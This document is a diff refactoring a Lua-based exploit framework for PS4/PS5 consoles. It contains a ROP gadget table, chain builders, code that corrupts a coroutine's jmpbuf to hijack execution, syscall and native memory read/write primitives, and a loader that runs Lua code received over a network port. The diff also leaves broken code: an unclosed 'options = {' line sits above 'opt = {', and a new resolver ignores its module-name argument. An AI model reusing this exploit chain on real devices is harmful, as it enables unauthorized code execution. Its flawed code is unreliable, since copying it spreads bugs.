@@ -2,13 +2,14 @@
 PLATFORM = "ps4"  -- ps4 or ps5
 FW_VERSION = nil
 
+options = {
 opt = {
     log_to_klog = true,
     enable_signal_handler = true,
     enable_native_handler = true,
 }
 
-if not opt.log_to_klog then
+if not options.log_to_klog then
     WRITABLE_PATH = "/av_contents/content_tmp/"
     LOG_FILE = WRITABLE_PATH .. "log.txt"
     log_fd = io.open(LOG_FILE, "w")
@@ -44,7 +45,7 @@ gadget_table = {
             ["pop rbp; ret"] = 0x79,
             ["pop rax; ret"] = 0xa02,
             ["pop rbx; ret"] = 0x5dce6,
-            ["pop rcx; ret"] = 0x0147cf,
+            ["pop rcx; ret"] = 0x147cf,
             ["pop rdx; ret"] = 0x53762,
             ["pop rdi; ret"] = 0x467c69,
             ["pop rsi; ret"] = 0xd2810,
@@ -544,7 +545,7 @@ function prepare_arguments(...)
     return s
 end
 
-if not opt.log_to_klog then
+if not options.log_to_klog then
     function print(...)
         log_fd:write(prepare_arguments(...) .. "\n")
         log_fd:flush()
@@ -552,7 +553,7 @@ if not opt.log_to_klog then
 end
 
 function printf(fmt, ...)
-    if opt.log_to_klog then
+    if options.log_to_klog then
         print(string.format(fmt, ...) .. "\n")
     else
         log_fd:write(string.format(fmt, ...) .. "\n")
@@ -1567,10 +1568,10 @@ end
 function ropchain.create_fcall_stub(size)
     
     ropchain.fcall_stub = {}
-    ropchain.fcall_stub.entry = memory.alloc(size) + (size - 0x100)  -- large padding
+    ropchain.fcall_stub.fn_addr = memory.alloc(size) + (size - 0x100)  -- large padding
     
     local stub = ropchain({
-        stack_base = ropchain.fcall_stub.entry,
+        stack_base = ropchain.fcall_stub.fn_addr,
         start_from_base = true
     })
 
@@ -1786,22 +1787,22 @@ function ropchain:push_store_rax_into_memory(addr)
     self:push(gadgets["mov [rdi], rax; ret"])
 end
 
-function ropchain:push_store_rcx_into_memory(addr) -- clobbers rax
+function ropchain:push_store_rcx_into_memory(addr) -- clobber rax
     self:push_set_rax(addr - 0x8)
     self:push(gadgets["mov [rax + 8], rcx; ret"])
 end
 
-function ropchain:push_store_rdx_into_memory(addr) -- clobbers rax
+function ropchain:push_store_rdx_into_memory(addr) -- clobber rax
     self:push_set_rax(addr - 0x28)
     self:push(gadgets["mov [rax + 0x28], rdx; ret"])
 end
 
-function ropchain:push_store_rdi_into_memory(addr) -- clobbers rcx
+function ropchain:push_store_rdi_into_memory(addr) -- clobber rcx
     self:push_set_rcx(addr - 0xa0)
     self:push(gadgets["mov [rcx + 0xa0], rdi; ret"])
 end
 
-function ropchain:push_add_to_rax(num)
+function ropchain:push_add_to_rax(num)  -- clobber r8
     self:push_set_r8(num)
     self:push(gadgets["add rax, r8; ret"])
 end
@@ -1885,9 +1886,9 @@ function ropchain:push_fcall_raw(rip, prep_arg_callback, is_ptr)
 
     if is_ptr then
         self:push_set_rax_from_memory(rip)
-        self:push_store_rax_into_memory(ropchain.fcall_stub.entry)
+        self:push_store_rax_into_memory(ropchain.fcall_stub.fn_addr)
     else
-        self:push_write_qword_memory(ropchain.fcall_stub.entry, rip)
+        self:push_write_qword_memory(ropchain.fcall_stub.fn_addr, rip)
     end
 
     self:push_write_qword_memory(ropchain.fcall_stub.retval_addr, ret_value)
@@ -1897,7 +1898,7 @@ function ropchain:push_fcall_raw(rip, prep_arg_callback, is_ptr)
     local push_cb = function()
         self:push_write_qword_memory(ropchain.fcall_stub.return_addr, self:get_rsp() + push_size)
         prep_arg_callback()
-        self:push_set_rsp(ropchain.fcall_stub.entry)
+        self:push_set_rsp(ropchain.fcall_stub.fn_addr)
     end
 
     push_size = self:mock_push(push_cb)
@@ -1983,33 +1984,32 @@ function ropchain:gen_loop(value_address, op, compare_address, callback)
     })
 end
 
-function ropchain:finalize_for_execution(jmpbuf_backup)
+function ropchain:restore_through_longjmp(jmpbuf)
     
     if self.finalized then
         return
     end
 
-    self.jmpbuf_size = 0x100
-    self.jmpbuf_backup = jmpbuf_backup or memory.alloc(self.jmpbuf_size)
+    self.jmpbuf = jmpbuf or memory.alloc(0x100)
 
     -- restore execution through longjmp
-    self:push_fcall(libc_addrofs.longjmp, self.jmpbuf_backup, 0)
+    self:push_fcall(libc_addrofs.longjmp, self.jmpbuf, 0)
 
     self.finalized = true
 end
 
 -- corrupt coroutine's jmpbuf for code execution
-function ropchain:execute()
+function ropchain:execute_through_coroutine()
 
     if not self.finalized then
-        error("ropchain:execute() requires finalize_for_execution to be called first")
+        error("ropchain:execute_through_coroutine() requires restore_through_longjmp() to be called first")
     end
 
     local run_hax = function(lua_state_addr)
 
         -- backup original jmpbuf
         local jmpbuf_addr = lua.read_qword(lua_state_addr+0xa8) + 0x8
-        lua.memcpy(self.jmpbuf_backup, jmpbuf_addr, self.jmpbuf_size)
+        lua.memcpy(self.jmpbuf, jmpbuf_addr, 0x100)
 
         -- overwrite registers in jmpbuf
         lua.write_qword(jmpbuf_addr + 0, gadgets["ret"])    -- rip
@@ -2031,82 +2031,85 @@ end
 
 
 --
--- function rop class
+-- create fcall class
 --
 -- helper to execute function or syscall through rop
 --
 
-function_rop = {}
-function_rop.__index = function_rop
+fcall = {}
+fcall.__index = fcall
 
-setmetatable(function_rop, {
-    __call = function(_, address)  -- make class callable as constructor
-        return function_rop:new(address)
+setmetatable(fcall, {
+    __call = function(_, fn_addr, rax)  -- make class callable as constructor
+        return fcall:new(fn_addr, rax)
     end
 })
 
-function function_rop:new(fn_addr, rax)
+function fcall:new(fn_addr, rax)
 
     assert(fn_addr, "invalid function address")
-
-    local self = setmetatable({}, function_rop)
     
-    if not function_rop.chain then
-        
-        local chain = ropchain()
-
-        local placeholder = {
-            fn_addr = memory.alloc(8),
-            rax = memory.alloc(8),
-            rdi = memory.alloc(8),
-            rsi = memory.alloc(8),
-            rdx = memory.alloc(8),
-            rcx = memory.alloc(8),
-            r8 = memory.alloc(8),
-            r9 = memory.alloc(8),
-        }
-
-        local prep_arg_callback = function()
-            chain:push_set_reg_from_memory("r9", placeholder.r9)
-            chain:push_set_reg_from_memory("r8", placeholder.r8)
-            chain:push_set_reg_from_memory("rcx", placeholder.rcx)
-            chain:push_set_reg_from_memory("rdx", placeholder.rdx)
-            chain:push_set_reg_from_memory("rsi", placeholder.rsi)
-            chain:push_set_reg_from_memory("rdi", placeholder.rdi)
-            chain:push_set_rax_from_memory(placeholder.rax)
-        end
-        
-        chain:push_fcall_raw(placeholder.fn_addr, prep_arg_callback, true)
-        chain:finalize_for_execution()
-
-        chain.placeholder = placeholder
-        function_rop.chain = chain
+    if not fcall.chain then
+        fcall.create_initial_chain()
     end
 
+    local self = setmetatable({}, fcall)
     self.fn_addr = fn_addr
     self.rax = rax
-
     return self
 end
 
-function function_rop:__call(rdi, rsi, rdx, rcx, r8, r9)
+function fcall.create_initial_chain()
 
-    local placeholder = function_rop.chain.placeholder
+    local arg_addr = {
+        fn_addr = memory.alloc(8),
+        rax = memory.alloc(8),
+        rdi = memory.alloc(8),
+        rsi = memory.alloc(8),
+        rdx = memory.alloc(8),
+        rcx = memory.alloc(8),
+        r8 = memory.alloc(8),
+        r9 = memory.alloc(8),
+    }
 
-    lua.write_qword(placeholder.fn_addr, self.fn_addr)
-    lua.write_qword(placeholder.rax, self.rax or 0)
-    lua.write_qword(placeholder.rdi, ropchain.resolve_value(rdi or 0))
-    lua.write_qword(placeholder.rsi, ropchain.resolve_value(rsi or 0))
-    lua.write_qword(placeholder.rdx, ropchain.resolve_value(rdx or 0))
-    lua.write_qword(placeholder.rcx, ropchain.resolve_value(rcx or 0))
-    lua.write_qword(placeholder.r8, ropchain.resolve_value(r8 or 0))
-    lua.write_qword(placeholder.r9, ropchain.resolve_value(r9 or 0))
+    local chain = ropchain()
+
+    local prep_arg_callback = function()
+        chain:push_set_reg_from_memory("r9", arg_addr.r9)
+        chain:push_set_reg_from_memory("r8", arg_addr.r8)
+        chain:push_set_reg_from_memory("rcx", arg_addr.rcx)
+        chain:push_set_reg_from_memory("rdx", arg_addr.rdx)
+        chain:push_set_reg_from_memory("rsi", arg_addr.rsi)
+        chain:push_set_reg_from_memory("rdi", arg_addr.rdi)
+        chain:push_set_rax_from_memory(arg_addr.rax)
+    end
     
-    return select(1, function_rop.chain:execute())
+    chain:push_fcall_raw(arg_addr.fn_addr, prep_arg_callback, true)
+    chain:restore_through_longjmp()
+
+    fcall.arg_addr = arg_addr
+    fcall.chain = chain
 end
 
-function function_rop:__tostring()
-    return string.format("address @ %s\n%s", hex(self.fn_addr), tostring(function_rop.chain))
+function fcall:__call(rdi, rsi, rdx, rcx, r8, r9)
+    if native_invoke then
+        return native.fcall_with_rax(self.fn_addr, self.rax, rdi, rsi, rdx, rcx, r8, r9)
+    else
+        local arg_addr = fcall.arg_addr
+        lua.write_qword(arg_addr.fn_addr, self.fn_addr)
+        lua.write_qword(arg_addr.rax, self.rax or 0)
+        lua.write_qword(arg_addr.rdi, ropchain.resolve_value(rdi or 0))
+        lua.write_qword(arg_addr.rsi, ropchain.resolve_value(rsi or 0))
+        lua.write_qword(arg_addr.rdx, ropchain.resolve_value(rdx or 0))
+        lua.write_qword(arg_addr.rcx, ropchain.resolve_value(rcx or 0))
+        lua.write_qword(arg_addr.r8, ropchain.resolve_value(r8 or 0))
+        lua.write_qword(arg_addr.r9, ropchain.resolve_value(r9 or 0))
+        return select(1, fcall.chain:execute_through_coroutine())
+    end
+end
+
+function fcall:__tostring()
+    return string.format("address @ %s\n%s", hex(self.fn_addr), tostring(fcall.chain))
 end
 
 
@@ -2138,40 +2141,32 @@ function syscall.init()
         errorf("invalid platform %s", PLATFORM)
     end
 
-    syscall.resolve({
-        getpid = 20,
-    })
-
-    -- sanity check
-    local pid = syscall.getpid()
-    if not (pid and pid.h == 0 and pid.l ~= 0) then
-        error("syscall test failed")
-    end
+    syscall.do_sanity_check()
 end
 
 function syscall.resolve(list)
     for name, num in pairs(list) do
-        if PLATFORM == "ps4" then
+        if PLATFORM == "ps4" and not syscall[name] then
             if syscall.syscall_wrapper[num] then
-                if native_invoke then
-                    syscall[name] = function(...)
-                        return native.fcall(syscall.syscall_wrapper[num], ...)
-                    end
-                else
-                    syscall[name] = function_rop(syscall.syscall_wrapper[num])
-                end
+                syscall[name] = fcall(syscall.syscall_wrapper[num])
             else
                 printf("warning: syscall %s (%d) not found", name, num)
             end
-        elseif PLATFORM == "ps5" then
-            if native_invoke then
-                syscall[name] = function(...)
-                    return native.fcall_with_rax(syscall.syscall_address, num, ...)
-                end
-            else
-                syscall[name] = function_rop(syscall.syscall_address, num)
-            end
+        elseif PLATFORM == "ps5" and not syscall[name] then
+            syscall[name] = fcall(syscall.syscall_address, num)
         end
+    end
+end
+
+function syscall.do_sanity_check()
+
+    syscall.resolve({
+        getpid = 20,
+    })
+
+    local pid = syscall.getpid()
+    if not (pid and pid.h == 0 and pid.l ~= 0) then
+        error("syscall test failed")
     end
 end
 
@@ -2235,8 +2230,8 @@ function run_lua_code(lua_code, client_fd)
 end
 
 function get_error_string()
-    local strerror = function_rop(libc_addrofs.strerror)
-    local error_func = function_rop(libc_addrofs.error)
+    local strerror = fcall(libc_addrofs.strerror)
+    local error_func = fcall(libc_addrofs.error)
     local errno = memory.read_qword(error_func())
     return errno:tonumber() .. " " .. memory.read_null_terminated_string(strerror(errno))
 end
@@ -2291,8 +2286,9 @@ function remote_lua_loader(port)
     notify(string.format("remote lua loader\nrunning on %s %s\nlistening on port %d",
         PLATFORM, FW_VERSION, port))
     
-    if opt.enable_signal_handler then
-        signal.init() -- setup signal handler
+    -- setup signal handler
+    if options.enable_signal_handler then
+        signal.init()
         print("[+] signal handler registered")
     end
 
@@ -2318,8 +2314,8 @@ function remote_lua_loader(port)
             
             printf("[+] accepted lua code with size %d (%s)", #lua_code, hex(#lua_code))
             
-            if opt.enable_signal_handler then
-                signal.set_fd(client_fd)
+            if options.enable_signal_handler then
+                signal.set_sink_fd(client_fd)
             end
 
             run_lua_code(lua_code, client_fd)
@@ -2336,7 +2332,7 @@ function remote_lua_loader(port)
 end
 
 function get_module_name(addr)
-    local sceKernelGetModuleInfoFromAddr = function_rop(libc_addrofs.sceKernelGetModuleInfoFromAddr)
+    local sceKernelGetModuleInfoFromAddr = fcall(libc_addrofs.sceKernelGetModuleInfoFromAddr)
     local buf = memory.alloc(0x100)
     if sceKernelGetModuleInfoFromAddr(addr, 1, buf):tonumber() ~= 0 then
         return nil
@@ -2344,23 +2340,21 @@ function get_module_name(addr)
     return memory.read_null_terminated_string(buf+8)
 end
 
-function resolve_libkernel_hacky()
+function resolve_base(initial_addr, modname, max_page_search)
 
-    local gettimeofday = memory.read_qword(libc_addrofs.gettimeofday_import)
-    local base = gettimeofday:band(uint64(0xfff):bnot())
+    local base_addr = initial_addr:band(uint64(0xfff):bnot())
     local page_size = 0x1000
-    local min_search = base - 5 * page_size
 
-    while min_search < base do
-        local cur_page_modname = get_module_name(base)
-        local prev_page_modname = get_module_name(base - page_size)
-        if cur_page_modname == "libkernel.sprx" and prev_page_modname ~= "libkernel.sprx" then
+    for i=1, max_page_search do
+        local base = base_addr - i*page_size
+        local cur_modname = get_module_name(base)
+        local prev_modname = get_module_name(base - page_size)
+        if cur_modname == "libkernel.sprx" and prev_modname ~= "libkernel.sprx" then
             return base
         end
-        base = base - page_size
     end
 
-    error("failed to resolve libkernel base")
+    errorf("failed to resolve %s base", modname)
 end
 
 function sysctlbyname(name, oldp, oldp_len, newp, newp_len)
@@ -2413,78 +2407,78 @@ function native.get_lua_opt(chain, fn, a1, a2, a3)
     end)
 end
 
-function native.gen_fcall(lua_state)
+function native.gen_fcall_chain(lua_state)
 
-    local fcall = ropchain({
+    local chain = ropchain({
         start_from_base = true,
     })
 
-    native.get_lua_opt(fcall, eboot_addrofs.luaL_optinteger, lua_state, 2, 0)  -- 1 - fn addr
-    native.get_lua_opt(fcall, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 2 - rax (for syscall)
-    native.get_lua_opt(fcall, eboot_addrofs.luaL_optinteger, lua_state, 4, 0)  -- 3 - rdi
-    native.get_lua_opt(fcall, eboot_addrofs.luaL_optinteger, lua_state, 5, 0)  -- 4 - rsi
-    native.get_lua_opt(fcall, eboot_addrofs.luaL_optinteger, lua_state, 6, 0)  -- 5 - rdx
-    native.get_lua_opt(fcall, eboot_addrofs.luaL_optinteger, lua_state, 7, 0)  -- 6 - rcx
-    native.get_lua_opt(fcall, eboot_addrofs.luaL_optinteger, lua_state, 8, 0)  -- 7 - r8
-    native.get_lua_opt(fcall, eboot_addrofs.luaL_optinteger, lua_state, 9, 0)  -- 8 - r9
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 2, 0)  -- 1 - fn addr
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 2 - rax (for syscall)
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 4, 0)  -- 3 - rdi
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 5, 0)  -- 4 - rsi
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 6, 0)  -- 5 - rdx
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 7, 0)  -- 6 - rcx
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 8, 0)  -- 7 - r8
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 9, 0)  -- 8 - r9
 
     local prep_arg_callback = function()
-        fcall:push_set_reg_from_memory("r9", fcall.retval_addr[8])
-        fcall:push_set_reg_from_memory("r8", fcall.retval_addr[7])
-        fcall:push_set_reg_from_memory("rcx", fcall.retval_addr[6])
-        fcall:push_set_reg_from_memory("rdx", fcall.retval_addr[5])
-        fcall:push_set_reg_from_memory("rsi", fcall.retval_addr[4])
-        fcall:push_set_reg_from_memory("rdi", fcall.retval_addr[3])
-        fcall:push_set_rax_from_memory(fcall.retval_addr[2])
+        chain:push_set_reg_from_memory("r9", chain.retval_addr[8])
+        chain:push_set_reg_from_memory("r8", chain.retval_addr[7])
+        chain:push_set_reg_from_memory("rcx", chain.retval_addr[6])
+        chain:push_set_reg_from_memory("rdx", chain.retval_addr[5])
+        chain:push_set_reg_from_memory("rsi", chain.retval_addr[4])
+        chain:push_set_reg_from_memory("rdi", chain.retval_addr[3])
+        chain:push_set_rax_from_memory(chain.retval_addr[2])
     end
 
-    fcall:push_fcall_raw(fcall.retval_addr[1], prep_arg_callback, true)
+    chain:push_fcall_raw(chain.retval_addr[1], prep_arg_callback, true)
 
     -- pass return value to caller
-    fcall:push_fcall_raw(eboot_addrofs.lua_pushinteger, function()
-        fcall:push_set_reg_from_memory("rsi", fcall.retval_addr[9])
-        fcall:push_set_reg_from_memory("rdi", lua_state)
+    chain:push_fcall_raw(eboot_addrofs.lua_pushinteger, function()
+        chain:push_set_reg_from_memory("rsi", chain.retval_addr[9])
+        chain:push_set_reg_from_memory("rdi", lua_state)
     end)
 
-    return fcall
+    return chain
 end
 
-function native.gen_read_buffer(lua_state)
+function native.gen_read_buffer_chain(lua_state)
 
-    local read_buffer = ropchain({
+    local chain = ropchain({
         start_from_base = true,
     })
 
-    native.get_lua_opt(read_buffer, eboot_addrofs.luaL_optinteger, lua_state, 2, 0)  -- 1 - addr to read
-    native.get_lua_opt(read_buffer, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 2 - size
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 2, 0)  -- 1 - addr to read
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 2 - size
 
-    read_buffer:push_fcall_raw(eboot_addrofs.lua_pushlstring, function()
-        read_buffer:push_set_reg_from_memory("rdx", read_buffer.retval_addr[2])
-        read_buffer:push_set_reg_from_memory("rsi", read_buffer.retval_addr[1])
-        read_buffer:push_set_reg_from_memory("rdi", lua_state)
+    chain:push_fcall_raw(eboot_addrofs.lua_pushlstring, function()
+        chain:push_set_reg_from_memory("rdx", chain.retval_addr[2])
+        chain:push_set_reg_from_memory("rsi", chain.retval_addr[1])
+        chain:push_set_reg_from_memory("rdi", lua_state)
     end)
 
-    return read_buffer
+    return chain
 end
 
-function native.gen_write_buffer(lua_state)
+function native.gen_write_buffer_chain(lua_state)
 
-    local write_buffer = ropchain({
+    local chain = ropchain({
         start_from_base = true,
     })
 
-    write_buffer.string_len = memory.alloc(0x8)
+    chain.string_len = memory.alloc(0x8)
 
-    native.get_lua_opt(write_buffer, eboot_addrofs.luaL_optinteger, lua_state, 2, 0)  -- 1 - dest to write
-    native.get_lua_opt(write_buffer, eboot_addrofs.luaL_checklstring, lua_state, 3, write_buffer.string_len)  -- 2 - src buffer
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 2, 0)  -- 1 - dest to write
+    native.get_lua_opt(chain, eboot_addrofs.luaL_checklstring, lua_state, 3, chain.string_len)  -- 2 - src buffer
 
-    write_buffer:push_fcall_raw(libc_addrofs.memcpy, function()
-        write_buffer:push_set_reg_from_memory("rdx", write_buffer.string_len)
-        write_buffer:push_set_reg_from_memory("rsi", write_buffer.retval_addr[2])
-        write_buffer:push_set_reg_from_memory("rdi", write_buffer.retval_addr[1])
+    chain:push_fcall_raw(libc_addrofs.memcpy, function()
+        chain:push_set_reg_from_memory("rdx", chain.string_len)
+        chain:push_set_reg_from_memory("rsi", chain.retval_addr[2])
+        chain:push_set_reg_from_memory("rdi", chain.retval_addr[1])
     end)
 
-    return write_buffer
+    return chain
 end
 
 function native.create_dispatcher(pivot_handler)
@@ -2535,15 +2529,15 @@ function native.create_native_handler(dispatcher)
 
     local register_handle = function(list)
         for i, handler in ipairs(list) do
-            handler:finalize_for_execution(dispatcher.jmpbuf_backup)
+            handler:restore_through_longjmp(dispatcher.jmpbuf_backup)
             memory.write_qword(dispatcher.jump_table + 8*(i-1), handler.stack_base)    
         end
     end
 
     local handler = {
-        native.gen_read_buffer(dispatcher.lua_state),
-        native.gen_write_buffer(dispatcher.lua_state),
-        native.gen_fcall(dispatcher.lua_state),
+        native.gen_read_buffer_chain(dispatcher.lua_state),
+        native.gen_write_buffer_chain(dispatcher.lua_state),
+        native.gen_fcall_chain(dispatcher.lua_state),
     }
 
     register_handle(handler)
@@ -2552,10 +2546,15 @@ function native.create_native_handler(dispatcher)
 end
 
 function native.init()
+
     local pivot_handler = gadgets.stack_pivot[2]
+
     native_dispatcher = native.create_dispatcher(pivot_handler)
     global_native_handler = native.create_native_handler(native_dispatcher)
+
     native_invoke = lua.create_fake_cclosure(pivot_handler.gadget_addr)
+
+    syscall.do_sanity_check()
 end
 
 function native.fcall_with_rax(fn_addr, rax, rdi, rsi, rdx, rcx, r8, r9)
@@ -2574,7 +2573,7 @@ function native.fcall_with_rax(fn_addr, rax, rdi, rsi, rdx, rcx, r8, r9)
 end
 
 function native.fcall(fn_addr, rdi, rsi, rdx, rcx, r8, r9)
-    return native.fcall_with_rax(fn_addr, 0, rdi, rsi, rdx, rcx, r8, r9)
+    return native.fcall_with_rax(fn_addr, nil, rdi, rsi, rdx, rcx, r8, r9)
 end
 
 function native.read_buffer(addr, size)
@@ -2582,7 +2581,7 @@ function native.read_buffer(addr, size)
     return native_invoke(
         native_cmd.read_buffer,
         ropchain.resolve_value(addr):tonumber(),
-        ropchain.resolve_value(size or 0):tonumber()
+        ropchain.resolve_value(size):tonumber()
     )
 end
 
@@ -2590,15 +2589,10 @@ function native.write_buffer(addr, buf)
     assert(addr and buf)
     native_invoke(
         native_cmd.write_buffer,
-        ropchain.resolve_value(addr or 0):tonumber(),
+        ropchain.resolve_value(addr):tonumber(),
         buf
     )
 end
-
-
-
-
-
 
 
 
@@ -2691,7 +2685,6 @@ function signal.setup_handler(pivot_handler)
     chain:push_set_rdi(0)
     chain:push_set_rax(0)
     chain:push_set_rsp(0) -- will be changed
-
 end
 
 function signal.init()
@@ -2719,7 +2712,7 @@ function signal.init()
     signal.setup_handler(pivot_handler)
 end
 
-function signal.set_fd(fd)
+function signal.set_sink_fd(fd)
     memory.write_qword(signal.fd_addr, fd)
 end
 
@@ -2733,17 +2726,20 @@ function main()
     lua.setup_primitives()
 
     -- setup better write primitive
-    memory.memcpy = function_rop(libc_addrofs.memcpy)
+    memory.memcpy = fcall(libc_addrofs.memcpy)
 
     print("[+] usermode r/w primitives achieved")
 
-    libkernel_base = resolve_libkernel_hacky()
+    libkernel_base = resolve_base(
+        memory.read_qword(libc_addrofs.gettimeofday_import),
+        "libkernel.sprx", 5
+    )
 
     print("[+] libkernel base @ " .. hex(libkernel_base))
 
     syscall.init()  -- enable syscall
 
-    if opt.enable_native_handler then
+    if options.enable_native_handler then
         native.init()
         print("[+] native handler registered")
     end
